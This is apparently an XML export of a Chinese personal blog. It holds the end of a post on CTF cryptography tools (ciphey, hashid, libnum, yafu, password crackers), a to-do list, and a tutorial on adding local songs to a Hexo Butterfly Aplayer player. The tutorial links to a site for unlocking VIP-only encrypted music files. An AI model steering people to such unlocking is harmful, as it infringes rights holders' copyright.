&quot;Encrypted input&quot;</span><br></pre></td></tr></table></figure><p>当密文较为短小时，使用直接输入密文的方式更为方便</p></li><li><p><strong>适用范围＆局限性</strong>：</p><ul><li><p>当涉及到<strong>多层编码</strong>时，ciphey的分析速度可以很快，比如下面的例子：</p><p>将flag经过base32-&gt;base58-&gt;base64加密，运行<code>ciphey -t &quot;I44EOOLCIFUDQ5KLME======&quot;</code>，结果如下：</p><p><img src="img/image-20230521103427519.png" alt="image-20230521103427519" style="zoom: 80%;" /></p></li><li><p>当明文包含<strong>flag{}格式</strong>，或者是有<strong>强烈的英文语义</strong>时，ciphey的识别效果比较好✔，但是ciphey基本无法识别明文带有中文语义或者没有语义的复杂密文🚫</p></li><li><p>识别效果好的密码和编码包括：凯撒密码、各种base编码、url编码</p></li><li><p>识别效果差的密码和编码包括：莫尔斯密码、unicode编码等等</p></li></ul><div class="note warning flat"><p>可以看出这个工具并非万能，后续我会写文章为ciphey不适用的编码和密码形式提供本地或在线解码方案</p></div></li></ul></li></ul><h4 id="hashid"><a href="#hashid" class="headerlink" title="hashid"></a>hashid</h4><ul><li><p>安装指令：<code>pip install hashid</code></p></li><li><p>使用场景： 用于识别hash算法：给它一个hash值，它就能判断出这个值是哪种类型的hash值。</p><ul><li><p><strong>基础用法</strong>：</p><p>打开<strong>hashid.exe</strong>文件，输入想要分析的hash值，软件会自动在列出可能的hash类型，排列越靠上概率越大，如下：</p><p><img src="img/image-20230521154651291.png" alt="image-20230521154651291" style="zoom: 67%;" /></p><p>hashid分析结果为：该hash值的类型为SHA224概率最大。</p></li></ul></li></ul><h4 id="libnum"><a href="#libnum" class="headerlink" title="libnum"></a>libnum</h4><ul><li><p>安装指令：<code>pip install libnum</code></p></li><li><p>使用场景：进制转换、打素数表等等</p><ul><li><p><strong>基础用法</strong>：</p><ul><li><strong>进制转换</strong></li></ul><p><code>libnum.s2n(s)</code>：<strong>字符串转换为数字</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">&quot;ab12&quot;</span></span><br><span class="line"><span class="built_in">print</span>(libnum.s2n(s))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1633825074</span></span><br></pre></td></tr></table></figure><p><code>libnum.s2n(n)</code>：<strong>数字转换为字符串</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">1633825074</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(n))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure><p><code>libnum.s2b(s)</code>：<strong>字符串转换为二进制字符串</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">&quot;ab12&quot;</span></span><br><span class="line"><span class="built_in">print</span>(libnum.s2b(s))</span><br><span class="line"></span><br><span class="line">result: 01100001011000100011000100110010</span><br></pre></td></tr></table></figure><p><code>libnum.b2s(b)</code>：<strong>二进制字符串转换为字符串</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">b = <span class="string">&quot;01100001011000100011000100110010&quot;</span></span><br><span class="line"><span class="built_in">print</span>(libnum.b2s(b))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br></pre></td></tr></table></figure><ul><li>素数相关</li></ul><p><code>libnum.primes(n)</code>：<strong>返回不大于n的素数列表</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.primes(<span class="number">19</span>))</span><br><span class="line"></span><br><span class="line">result: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure><p><code>libnum.generate_prime(n)</code>：<strong>产生长度为n位的伪素数</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.generate_prime(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1021</span></span><br></pre></td></tr></table></figure><p><code>libnum.factorize(n)</code>：<strong>返回n的所有素因子及每个素因子的个数</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.factorize(<span class="number">60</span>))</span><br><span class="line"></span><br><span class="line">result: &#123;<span class="number">2</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">1</span>, <span class="number">5</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="factordb-python"><a href="#factordb-python" class="headerlink" title="factordb-python"></a>factordb-python</h4><ul><li><p>安装指令：<code>pip3 install factordb-python</code></p></li><li><p>使用场景：FactorDB存储了该库已经知道的整数的分解，该库可以用在RSA中的大整数分解</p><ul><li><p>基础用法：</p><p><strong>命令行使用</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factordb factor(需要分解的大数)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="常用库函数清单"><a href="#常用库函数清单" class="headerlink" title="常用库函数清单"></a>常用库函数清单</h3><ol><li><p>gmpy2</p></li><li><p>pwntools</p></li><li><p>pycryptodome</p></li><li><p>ciphey</p></li><li><p>hashid</p></li><li><p>libnum</p></li><li><p>factordb-python</p></li></ol><h2 id="Crypto常用的工具"><a href="#Crypto常用的工具" class="headerlink" title="Crypto常用的工具"></a>Crypto常用的工具</h2><h3 id="常用工具功能"><a href="#常用工具功能" class="headerlink" title="常用工具功能"></a>常用工具功能</h3><h4 id="yafu-1-34"><a href="#yafu-1-34" class="headerlink" title="yafu-1.34"></a>yafu-1.34</h4><ul><li><p>使用场景：yafu用于自动整数因式分解，在RSA中，当<strong>p、q的取值差异过大或过于相近</strong>的时候，使用yafu可以快速的把n值分解出p、q值，原理是使用Fermat方法与Pollard rho方法等</p><ul><li><p><strong>基础用法</strong>：</p><p>在yafu-x64.exe所在的文件夹下<strong>打开终端</strong>，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接输入大整数</span></span><br><span class="line">yafu-x64 factor(需要分解的大数)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将大整数放在test.txt文件中</span></span><br><span class="line">yafu-x64 &quot;factor(@)&quot; -batchfile test.txt</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>将大整数放在文件中时最后一定要换行。</p></div></li></ul></li><li><p>其他版本：当然也有yafu-v2.1版本，但是适合租一台高性能云主机来跑，docker镜像：<code>docker run -ti --name yafu ssst0n3/yafu:2.10</code></p></li></ul><h3 id="常用工具清单"><a href="#常用工具清单" class="headerlink" title="常用工具清单"></a>常用工具清单</h3><ol><li><p>hashcat</p></li><li><p>John the Ripper</p></li><li><p>crypto-attacks-master</p></li><li><p>CTFCrackTools</p></li><li><p>[随波逐流]CTF编码工具 V1.0.20201101</p></li><li><p>yafu</p><ul><li>1.34: <a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></li><li>2.0: <a href="https://github.com/bbuhrow/yafu">https://github.com/bbuhrow/yafu</a></li></ul></li><li><p>sagemath</p><ul><li><a href="https://www.sagemath.org/zh/">SageMath - 中文</a></li></ul></li><li><p>CaptfEncoder</p><ul><li><a href="https://github.com/guyoung/CaptfEncoder">guyoung/CaptfEncoder (github.com)</a></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 软件工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>待写文章清单</title>
      <link href="/posts/5afb1c66bf9f/"/>
      <url>/posts/5afb1c66bf9f/</url>
      
        <content type="html"><![CDATA[<div class='checkbox red'><input type="checkbox" />            <p>create博客<strong>R1ck’s Portal</strong>的原因</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>Crypto中的常用库和工具总结</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>《动手学深度学习》系列笔记(1/n篇)</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>CTF Web入门(15/n篇)</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>CTF WriteUp (10/n篇)</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>B站up主推荐</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>win10软件推荐</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>生存狂装备入门计划</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>Kali日记系列</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>音乐推荐 (1/n篇)</p>            </div><div class='checkbox minus red checked'><input type="checkbox" checked="checked"/>            <p>影评剧评 (0/n篇)</p>            </div>]]></content>
      
      
      
        <tags>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly主题Aplayer本地音源添加</title>
      <link href="/posts/cb8aede32db1/"/>
      <url>/posts/cb8aede32db1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>构想博客之初，音乐🎵就是我脑海中的重要设计部分之一。</p><p>音乐是提升生产效率的工具，是朋友间闲聊的一大谈资。更重要的，音乐赋予了我分享精神世界的权利：透过我分享的歌单，所有人都能对我的内心窥探一二、与我共情。</p><p>都说“以代码为笔”。其实除了代码，于我而言，音乐也是一种语言。那么对于这种表达方式，当然需要我在博客中合理地设计它。</p><h2 id="MetingJS的局限"><a href="#MetingJS的局限" class="headerlink" title="MetingJS的局限"></a>MetingJS的局限</h2><p>在网上寻觅了许久教程，我也试着为自己的博客添加<strong>aplayer音乐播放器</strong>。整个过程非常顺利，直到测试时我才发现这个播放器在大部分教程中的用法<strong>并不能满足我的需求</strong>：</p><div class="note info flat"><p>大部分博客教程中展示的aplayer用法是基于引入MetingJS后的版本，即播放在线平台（QQ音乐、网易云音乐等）的单曲和歌单。</p><details class="toggle" ><summary class="toggle-button" style="">meting使用方法</summary><div class="toggle-content"><ol><li><p>在博客根目录下输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>来安装hexo-tag-aplayer插件</p></li><li><p>Hexo 配置文件 <code>_config.yml</code> 中设置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aplayer:</span></span><br><span class="line">  <span class="attr">meting:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>接着就可以通过 以下代码在文章中使用 MetingJS 播放器了：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 简单示例 (id, server, type)  --&gt;</span><br><span class="line">&#123;% meting &quot;60198&quot; &quot;netease&quot; &quot;playlist&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- 进阶示例 --&gt;</span><br><span class="line">&#123;% meting &quot;60198&quot; &quot;netease&quot; &quot;playlist&quot; &quot;autoplay&quot; &quot;mutex:false&quot; &quot;listmaxheight:340px&quot; &quot;preload:none&quot; &quot;theme:#ad7a86&quot;%&#125;</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>具体引入歌单id的方法就不在此赘述，很多教程中都有提到</p></div></li></ol></div></details></div><p>有关 <strong>meting</strong> 的选项列表如下:</p><div class="table-container"><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">默认值</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center"><strong>必须值</strong></td><td>歌曲 id / 播放列表 id / 相册 id / 搜索关键字</td></tr><tr><td style="text-align:center">server</td><td style="text-align:center"><strong>必须值</strong></td><td>音乐平台: <code>netease</code>, <code>tencent</code>, <code>kugou</code>, <code>xiami</code>, <code>baidu</code></td></tr><tr><td style="text-align:center">type</td><td style="text-align:center"><strong>必须值</strong></td><td><code>song</code>, <code>playlist</code>, <code>album</code>, <code>search</code>, <code>artist</code></td></tr><tr><td style="text-align:center">fixed</td><td style="text-align:center"><code>false</code></td><td>开启固定模式</td></tr><tr><td style="text-align:center">mini</td><td style="text-align:center"><code>false</code></td><td>开启迷你模式</td></tr><tr><td style="text-align:center">loop</td><td style="text-align:center"><code>all</code></td><td>列表循环模式：<code>all</code>, <code>one</code>,<code>none</code></td></tr><tr><td style="text-align:center">order</td><td style="text-align:center"><code>list</code></td><td>列表播放模式： <code>list</code>, <code>random</code></td></tr><tr><td style="text-align:center">volume</td><td style="text-align:center">0.7</td><td>播放器音量</td></tr><tr><td style="text-align:center">lrctype</td><td style="text-align:center">0</td><td>歌词格式类型</td></tr><tr><td style="text-align:center">listfolded</td><td style="text-align:center"><code>false</code></td><td>指定音乐播放列表是否折叠</td></tr><tr><td style="text-align:center">storagename</td><td style="text-align:center"><code>metingjs</code></td><td>LocalStorage 中存储播放器设定的键名</td></tr><tr><td style="text-align:center">autoplay</td><td style="text-align:center"><code>true</code></td><td>自动播放，移动端浏览器暂时不支持此功能</td></tr><tr><td style="text-align:center">mutex</td><td style="text-align:center"><code>true</code></td><td>该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</td></tr><tr><td style="text-align:center">listmaxheight</td><td style="text-align:center"><code>340px</code></td><td>播放列表的最大长度</td></tr><tr><td style="text-align:center">preload</td><td style="text-align:center"><code>auto</code></td><td>音乐文件预载入模式，可选项： <code>none</code>, <code>metadata</code>, <code>auto</code></td></tr><tr><td style="text-align:center">theme</td><td style="text-align:center"><code>#ad7a86</code></td><td>播放器风格色彩设置</td></tr></tbody></table></div><p>使用meting播放在线歌单固然方便，能将自己的QQ音乐或网易云等平台的歌单导入到播放器，歌词也能自动加载</p><p>但是播放在线歌单时会受到各大音乐平台的规则约束</p><div class="note danger flat"><p>使用meting的在线音源引用时，相应音源平台的<strong>会员歌曲</strong>和<strong>付费歌曲</strong>无法播放</p></div><p>如果只能小心翼翼地从免费歌曲里挑选自己想分享的放入博客，那还有什么意义呢</p><p>同时也会面临在线平台缺少特定歌曲的问题</p><p>那么本篇文章的重点来了：该如何<strong>往butterfly主题的Aplayer播放器里添加本地音源</strong>🤔</p><h2 id="引入本地音源"><a href="#引入本地音源" class="headerlink" title="引入本地音源"></a>引入本地音源</h2><p>以下为具体步骤<div class="note warning flat"><p>本教程仅适用于butterfly主题</p></div></p><h3 id="安装hexo-tag-aplayer插件"><a href="#安装hexo-tag-aplayer插件" class="headerlink" title="安装hexo-tag-aplayer插件"></a>安装hexo-tag-aplayer插件</h3><p>虽然不使用meting功能，但是hexo-tag-aplayer简化了向hexo引入aplayer的方式，所以本教程还是<strong>基于hexo-tag-aplayer展开</strong></p><p>在博客根目录下输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>来安装hexo-tag-aplayer插件</p><h3 id="配置yaml文件"><a href="#配置yaml文件" class="headerlink" title="配置yaml文件"></a>配置yaml文件</h3><p>修改 Hexo 的配置文件 <code>_config.yml</code> ，在末尾增加如下代码</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aplayer:</span></span><br><span class="line">  <span class="attr">cdn:</span> <span class="string">https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js</span>  <span class="comment"># 引用 APlayer.js 外部 CDN 地址</span></span><br><span class="line">  <span class="attr">style_cdn:</span> <span class="string">https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css</span> <span class="comment"># 引用 APlayer.css 外部 CDN 地址</span></span><br><span class="line">  <span class="attr">asset_inject:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="使用模板"><a href="#使用模板" class="headerlink" title="使用模板"></a>使用模板</h3><p>在需要放置aplayer播放器的页面引入模板</p><p>用例如下：</p><ul><li><p>单曲</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayer title author url [picture<span class="emphasis">_url, narrow, autoplay, width:xxx, lrc:xxx] %&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>播放列表</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayerlist %&#125;</span><br><span class="line">&#123;</span><br><span class="line"><span class="code">    &quot;narrow&quot;: false,                          // （可选）播放器袖珍风格</span></span><br><span class="line"><span class="code">    &quot;autoplay&quot;: true,                         // （可选) 自动播放，移动端浏览器暂时不支持此功能</span></span><br><span class="line"><span class="code">    &quot;mode&quot;: &quot;random&quot;,                         // （可选）曲目循环类型，有 &#x27;random&#x27;（随机播放）, &#x27;single&#x27; (单曲播放), &#x27;circulation&#x27; (循环播放), &#x27;order&#x27; (列表播放)， 默认：&#x27;circulation&#x27; </span></span><br><span class="line"><span class="code">    &quot;showlrc&quot;: 3,                             // （可选）歌词显示配置项，可选项有：1,2,3</span></span><br><span class="line"><span class="code">    &quot;mutex&quot;: true,                            // （可选）该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</span></span><br><span class="line"><span class="code">    &quot;theme&quot;: &quot;#e6d0b2&quot;,                      // （可选）播放器风格色彩设置，默认：#b7daff</span></span><br><span class="line"><span class="code">    &quot;preload&quot;: &quot;metadata&quot;,                    // （可选）音乐文件预载入模式，可选项： &#x27;none&#x27; &#x27;metadata&#x27; &#x27;auto&#x27;, 默认: &#x27;auto&#x27;</span></span><br><span class="line"><span class="code">    &quot;listmaxheight&quot;: &quot;513px&quot;,                 // (可选) 该播放列表的最大长度</span></span><br><span class="line"><span class="code">    &quot;music&quot;: [</span></span><br><span class="line"><span class="code">        &#123;</span></span><br><span class="line"><span class="code">            &quot;title&quot;: &quot;飞机场的10:30&quot;,</span></span><br><span class="line"><span class="code">            &quot;author&quot;: &quot;陶喆&quot;,</span></span><br><span class="line"><span class="code">            &quot;url&quot;: &quot;/music/index/飞机场的10_30.mp3&quot;,</span></span><br><span class="line"><span class="code">            &quot;pic&quot;: &quot;/music/index/飞机场的10_30.png&quot;,</span></span><br><span class="line"><span class="code">            &quot;lrc&quot;: &quot;飞机场的10_30.lrc&quot;</span></span><br><span class="line"><span class="code">        &#125;,</span></span><br><span class="line"><span class="code">        &#123;</span></span><br><span class="line"><span class="code">            &quot;title&quot;: &quot;好心分手&quot;,</span></span><br><span class="line"><span class="code">            &quot;author&quot;: &quot;王力宏、卢巧音&quot;,</span></span><br><span class="line"><span class="code">            &quot;url&quot;: &quot;/music/index/好心分手.mp3&quot;,</span></span><br><span class="line"><span class="code">            &quot;pic&quot;: &quot;/music/index/好心分手.png&quot;,</span></span><br><span class="line"><span class="code">            &quot;lrc&quot;: &quot;好心分手.lrc&quot;</span></span><br><span class="line"><span class="code">        &#125;</span></span><br><span class="line"><span class="code">    ]</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">&#123;% endaplayerlist %&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p>接下来只需要解决如何获得本地音源，即MP3文件、封面和歌词文件</p><h3 id="获取资源"><a href="#获取资源" class="headerlink" title="获取资源"></a>获取资源</h3><div class="note warning flat"><p><mark class="hl-label red">免责声明</mark> </p><p>本博客旨在分享音乐相关的知识和资源，包括但不限于音源下载方法。然而，我特此声明以下事项：</p><ol><li>所有分享的音源仅供个人学习和欣赏之用，不得用于任何商业目的。未经版权所有者的明确许可，禁止将下载的音源用于商业用途，包括但不限于出售、分发或以其他方式获取经济利益。</li><li>我在博客中提供的音源下载方法仅供参考，不能保证其合法性和可靠性。使用这些方法下载音源的风险由用户自行承担。如果用户违反了相关的版权法律法规，后果将由用户自行承担。</li><li>我对任何因使用博客中的方法下载音源而导致的任何损失或法律纠纷概不负责。用户应自行评估和承担使用这些方法的风险。</li><li>博客中提供的任何音源下载方法可能会随时发生变化，我不保证这些方法的持续可用性。用户应自行负责获取最新的音源下载方法和确保其合法性。</li><li>如果版权所有者认为博客中分享的音源侵犯了其权益，请及时联系我，我将尽快删除相关内容。</li></ol><p>请在使用本博客提供的音源下载方法之前，仔细阅读并理解本免责声明。通过使用这些方法下载音源，即表示您同意遵守本声明中的所有规定，并自愿承担由此可能引起的风险和责任。</p></div><p>若要获得vip单曲的MP3文件，可能会用到以下网站（将mgg后缀文件转为ogg）</p><p>跳转链接：<a class="btn-beautify blue" href="https://www.tjsky.net/music/"   title="音乐解锁"><i class="fa-solid fa-rotate"></i><span>音乐解锁</span></a></p><p>这里就不展开了，请自行摸索。</p><p>接下来我将以QQ音乐平台的免费单曲<strong>《淘汰》-陈奕迅</strong>为例，演示如何从获得本地音源所需文件：</p><h4 id="MP3文件"><a href="#MP3文件" class="headerlink" title="MP3文件"></a>MP3文件</h4><p>点击下载按钮，推荐选择HQ高品质</p><p><style>.dcvsvhwbnrcb{zoom: 67%;}</style><img src="/posts/cb8aede32db1/image-20230716223151574.png" class="dcvsvhwbnrcb" alt="2023-7-13&#x2F;image-20230716223151574"></p><p>在本地找到下载得到的文件，</p><img src="/posts/cb8aede32db1/image-20230716223630150.png" class="" title="image-20230716223630150"><p>在网站<a href="https://convertio.co/zh/">Convertio — 文件转换器</a>中将其转换为mp3文件</p><p><style>.lfblfvibhjwg{zoom:80%;}</style><img src="/posts/cb8aede32db1/image-20230716224108250.png" class="lfblfvibhjwg" alt="image-20230716224108250"></p><div class="note info flat"><p>这里用到的Convertio其实是以前打CTF时收录下来的网站，功能强大，能够转换的文件范围非常广泛，最关键的是完全免费使用、免注册（本人很反感在各种网站注册一大堆账号，很容易泄漏隐私）</p></div><h4 id="专辑封面图片"><a href="#专辑封面图片" class="headerlink" title="专辑封面图片"></a>专辑封面图片</h4><p>打开<a href="https://y.qq.com/">QQ音乐网页端</a>，搜索你想要的单曲，右键单曲封面将其另存为本地文件：</p><img src="/posts/cb8aede32db1/image-20230716225108945.png" class="" title="image-20230716225108945"><p>此时文件后缀为.webp</p><img src="/posts/cb8aede32db1/image-20230716225243226.png" class="" title="image-20230716225243226"><p>回到<a href="https://convertio.co/zh/">Convertio — 文件转换器</a>将其转换为PNG文件</p><div class="note info flat"><p>相比于webp格式，png在浏览器的兼容性更好</p></div><h4 id="歌词文件"><a href="#歌词文件" class="headerlink" title="歌词文件"></a>歌词文件</h4><p>在QQ音乐客户端的<strong>设置&gt;下载与缓存</strong>中勾选<strong>同时下载歌词</strong></p><p><style>.dvsweudvgnjo{zoom:67%;}</style><img src="/posts/cb8aede32db1/image-20230716225840712.png" class="dvsweudvgnjo" alt="image-20230716225840712"></p><p>在下载目录下就能找到与歌曲同名的lrc后缀歌词文件</p><div class="note warning flat"><p>此时若直接放在相应目录下，Aplayer则会在歌词栏显示乱码，需要将歌词文件转换为UTF-8格式</p></div><p>右击歌词文件，使用<strong>记事本</strong>打开</p><p><style>.mdsjuwphowkw{zoom:67%;}</style><img src="/posts/cb8aede32db1/image-20230716230538165.png" class="mdsjuwphowkw" alt="image-20230716230538165"></p><p>点击<strong>文件&gt;另存为</strong></p><p>保存类型选择<strong>所有文件</strong>，编码选择<strong>UTF-8</strong>，<strong>保存并替换</strong>原文件</p><img src="/posts/cb8aede32db1/image-20230716230755388.png" class="" title="image-20230716230755388"><h4 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h4><link rel="stylesheet" href="https://rickliu.com/music/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>        <div id="aplayer-BMjxzmYn" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;"></div>  <script>  var options = {"narrow":false,"autoplay":false,"showlrc":3,"mode":"order","mutex":true,"theme":"#ad7a86","preload":"metadata","listmaxheight":"513px","music":[{"title":"淘汰","author":"陈奕迅","url":"https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/%E9%99%88%E5%A5%95%E8%BF%85-%E6%B7%98%E6%B1%B0.mp3","pic":"/music/index/陈奕迅-淘汰.png","lrc":"/music/陈奕迅 - 淘汰.lrc"}]};  options.element = document.getElementById("aplayer-BMjxzmYn");  var ap = new APlayer(options);    window.aplayers || (window.aplayers = []);  window.aplayers.push(ap);  </script><h2 id="本教程更新日志"><a href="#本教程更新日志" class="headerlink" title="本教程更新日志"></a>本教程更新日志</h2><div class="timeline undefined"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>7-17</p></div></div><div class='timeline-item-content'><p>这两天给博客添加<strong>装备</strong>界面后，发现样式和我预想的不一致，原本应该<code>flex</code>的盒子却以<code>block</code>形式显示，后来才查阅到原来是<strong>用户代理样式表</strong>的问题</p><p><img src="/posts/cb8aede32db1/image-20230717165405225.png" class="" title="image-20230717165405225"></p><div class="note info flat"><p>用户代理样式表（User Agent Stylesheet）是一种CSS样式表，用于指定浏览器默认情况下渲染HTML元素的样式。每种浏览器都有自己的用户代理样式表，它们用于处理HTML文档中未定义样式的元素，使这些元素能够按照浏览器默认的样式来呈现。</p><p>用户代理样式表的作用是确保浏览器在没有指定任何样式的情况下，也能够提供合理的默认样式，从而使HTML文档在各种浏览器中都能够正确地呈现。用户代理样式表中定义了大量的CSS规则，包括字体、颜色、边框、内外边距、行高等，这些规则可以覆盖HTML元素的默认样式，从而改变它们的呈现方式。</p></div><p>找了一圈之后发现问题出在之前在Hexo 的配置文件 <code>_config.yml</code>中配置的属性<code>asset_inject: true</code></p><p>于是我换回了比较原始的引入aplayer播放器的方法，即在每个要引入的地方加入如下代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css&quot;</span>&gt;</span></span> </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div></div></div><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>目前网上还没有找到其它有关hexo的butterfly主题下向Aplayer播放器里添加本地音源的详细教程，本篇是作者自己通过试错总结出来的方案（花了整整一个小时QWQ）。如果有更好的改进方案，希望您能在评论区中指出，让大家的博客共同进步😊</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md">hexo-tag-aplayer官方文档</a></li><li><a href="https://www.bilibili.com/video/BV165411u7Z3">【艾力教程】如何将mflac，mgg，kw等格式文件转为mp3？ 简单教程！</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客搭建记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
